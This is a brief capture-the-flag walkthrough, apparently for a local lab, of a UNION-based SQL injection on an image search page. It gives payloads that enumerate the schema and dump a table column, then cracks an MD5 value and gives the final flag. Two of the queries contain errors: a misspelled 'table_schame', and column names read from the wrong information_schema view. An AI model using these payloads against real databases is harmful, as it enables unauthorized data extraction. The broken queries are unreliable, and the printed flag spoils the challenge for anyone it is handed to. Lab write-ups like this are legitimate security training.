**http://10.0.0.12/?page=searchimg**

This function is vulnerable to SQL injection although an error does not appear.
This uses similar input to that of the first SQL vulnerability that was found.

Firstly find if a vulnerability exists. Note that no response will be given.
Responses are only given to proper input.

Find the number of columns returned and the datatypes.
_1 union select null, null--_

Now get the schema for the current table. This will help with getting more information needed to get the flag.
_1 union select 1, table_name from information_schema.tables where table_schame = database()--_
_1 union select 1, column_name from information_schema.tables where table_schema = database()--_

With this new information, get the data found in the comment column of the list\_images table.
_1 union select 1, comment from list_images--_

Decode the long numerical value with a MD5 decoder to get the word 'albatroz'.
Encode it using sha256 to get the flag.

**FLAG:
F2A29020EF3132E01DD61DF97FD33EC8D7FCD1388CC9601E7DB691D17D4D6188**

https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/
https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html
https://portswigger.net/web-security/sql-injection/blind
